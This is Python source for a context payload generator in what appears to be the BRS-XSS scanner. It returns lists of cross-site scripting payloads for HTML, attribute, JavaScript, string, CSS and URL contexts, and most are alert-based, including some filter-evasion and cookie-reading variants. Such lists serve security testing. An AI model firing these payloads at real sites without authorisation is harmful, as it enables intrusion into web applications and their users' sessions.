#!/usr/bin/env python3

"""
BRS-XSS Context Payloads

Context-specific payload generators.

Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Modified: Вс 10 авг 2025 19:31:00 MSK
Telegram: https://t.me/EasyProTech
"""

from typing import Dict, List, Any, Optional, Mapping
from ..utils.logger import Logger

logger = Logger("core.context_payloads")


class ContextPayloadGenerator:
    """Generates context-specific XSS payloads"""
    
    def get_html_content_payloads(self) -> List[str]:
        """Get HTML content context payloads"""
        return [
            '<script>alert(1)</script>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<script>alert(document.domain)</script>',
            '<script>alert(document.cookie)</script>',
            '<script>eval("alert(1)")</script>',
            '<script>setTimeout("alert(1)",0)</script>',
            '<script>Function("alert(1)")()</script>',
            '<script>[].constructor.constructor("alert(1)")()</script>',
            '<img src=x onerror=alert(1)>',
            '<img src=x onerror="alert(1)">',
            '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
            '<svg onload=alert(1)>',
            '<svg onload="alert(1)">',
            '<iframe src=javascript:alert(1)>',
            '<body onload=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>',
            '<video controls oncanplay=alert(1)><source src=x>',
            '<audio controls oncanplay=alert(1)><source src=x>',
            '<input autofocus onfocus=alert(1)>',
            '<select autofocus onfocus=alert(1)>',
            '<textarea autofocus onfocus=alert(1)>',
            '<keygen autofocus onfocus=alert(1)>',
            '<object data=javascript:alert(1)>',
            '<embed src=javascript:alert(1)>'
        ]
    
    def get_html_attribute_payloads(self, context_info: Mapping[str, Any]) -> List[str]:
        """Get HTML attribute context payloads"""
        quote_char = context_info.get('quote_char', '"')
        attr_name = context_info.get('attribute_name', '')
        
        payloads = []
        
        # Quote escape payloads
        if quote_char == '"':
            payloads.extend([
                '"><script>alert(1)</script>',
                '" onmouseover="alert(1)',
                '" autofocus onfocus="alert(1)',
                '" onload="alert(1)',
                '" onerror="alert(1)',
                '" onclick="alert(1)'
            ])
        else:
            payloads.extend([
                "'><script>alert(1)</script>",
                "' onmouseover='alert(1)",
                "' autofocus onfocus='alert(1)",
                "' onload='alert(1)",
                "' onerror='alert(1)",
                "' onclick='alert(1)"
            ])
        
        # Attribute-specific payloads
        if attr_name.lower() in ['src', 'href', 'action']:
            payloads.extend([
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
            ])
        
        return payloads
    
    def get_javascript_payloads(self) -> List[str]:
        """Get JavaScript context payloads"""
        return [
            'alert(1)',
            'alert(String.fromCharCode(88,83,83))',
            'alert(document.domain)',
            'alert(document.cookie)',
            'console.log("XSS")',
            'prompt(1)',
            'confirm(1)',
            'eval("alert(1)")',
            'setTimeout("alert(1)",0)',
            'setInterval("alert(1)",0)',
            'Function("alert(1)")()',
            'constructor.constructor("alert(1)")()',
            '[].constructor.constructor("alert(1)")()',
            'alert.call(null,1)',
            'alert.apply(null,[1])',
            'window["alert"](1)',
            'self["alert"](1)',
            'top["alert"](1)',
            'parent["alert"](1)',
            'globalThis["alert"](1)'
        ]
    
    def get_js_string_payloads(self, context_info: Mapping[str, Any]) -> List[str]:
        """Get JavaScript string context payloads"""
        quote_char = context_info.get('quote_char', '"')
        
        return [
            f'{quote_char};alert(1);//',
            f'{quote_char};alert(1);{quote_char}',
            f'{quote_char}+alert(1)+{quote_char}',
            f'{quote_char}-alert(1)-{quote_char}',
            f'{quote_char};alert(1);var x={quote_char}',
            f'{quote_char}%0aalert(1)//',
            f'{quote_char}%0dalert(1)//',
            f'{quote_char}/**/;alert(1);//',
            f'{quote_char};eval("alert(1)");//',
            f'{quote_char};setTimeout("alert(1)",0);//',
            f'{quote_char};Function("alert(1)")();//',
            f'{quote_char};[].constructor.constructor("alert(1)")();//',
            f'{quote_char}\\x3balert(1);//',
            f'{quote_char}\\u003balert(1);//',
            f'{quote_char}\\073alert(1);//'
        ]
    
    def get_css_payloads(self) -> List[str]:
        """Get CSS context payloads"""
        return [
            'expression(alert(1))',
            'expression(alert("XSS"))',
            'expression(eval("alert(1)"))',
            'expression(window.alert(1))',
            'url(javascript:alert(1))',
            'url("javascript:alert(1)")',
            'url(\'javascript:alert(1)\')',
            'url(data:text/html,<script>alert(1)</script>)',
            '/**/expression(alert(1))/**/',
            '\\65 xpression(alert(1))',
            '\\000065 xpression(alert(1))',
            '\\45 xpression(alert(1))',
            'expr\\65 ssion(alert(1))',
            'expre\\73 sion(alert(1))',
            'expression\\28 alert(1)\\29'
        ]
    
    def get_url_payloads(self) -> List[str]:
        """Get URL parameter context payloads"""
        return [
            'javascript:alert(1)',
            'javascript:alert(String.fromCharCode(88,83,83))',
            'javascript:eval("alert(1)")',
            'javascript:setTimeout("alert(1)",0)',
            'javascript:Function("alert(1)")()',
            'data:text/html,<script>alert(1)</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            'vbscript:alert(1)',
            'about:blank">alert(1)',
            'wyciwyg://alert(1)',
            'feed:javascript:alert(1)',
            'firefoxurl:javascript:alert(1)',
            'opera:javascript:alert(1)',
            'moz-icon:javascript:alert(1)',
            'resource:javascript:alert(1)'
        ]
    
    def get_generic_payloads(self) -> List[str]:
        """Get generic payloads for unknown context"""
        return [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '<img src=x onerror=alert(1)>',
            '"><img src=x onerror=alert(1)>',
            "'><img src=x onerror=alert(1)>",
            '<svg onload=alert(1)>',
            '"><svg onload=alert(1)>',
            "'><svg onload=alert(1)>",
            'javascript:alert(1)',
            ';alert(1);//',
            "';alert(1);//",
            '";alert(1);//',
            '</script><script>alert(1)</script>',
            '<iframe src=javascript:alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>'
        ]
    
    def get_context_payloads(self, context_type: str, context_info: Mapping[str, Any]) -> List[str]:
        """
        Get payloads for specific context.
        
        Args:
            context_type: Type of context
            context_info: Additional context information
            
        Returns:
            List of context-appropriate payloads
        """
        logger.debug(f"Getting payloads for context: {context_type}")
        
        context_map = {
            'html_content': self.get_html_content_payloads,
            'html_attribute': lambda: self.get_html_attribute_payloads(context_info),
            'javascript': self.get_javascript_payloads,
            'js_string': lambda: self.get_js_string_payloads(context_info),
            'css_style': self.get_css_payloads,
            'url_parameter': self.get_url_payloads,
            'unknown': self.get_generic_payloads
        }
        
        generator_func = context_map.get(context_type, self.get_generic_payloads)
        payloads = generator_func()
        
        logger.debug(f"Generated {len(payloads)} context payloads")
        return payloads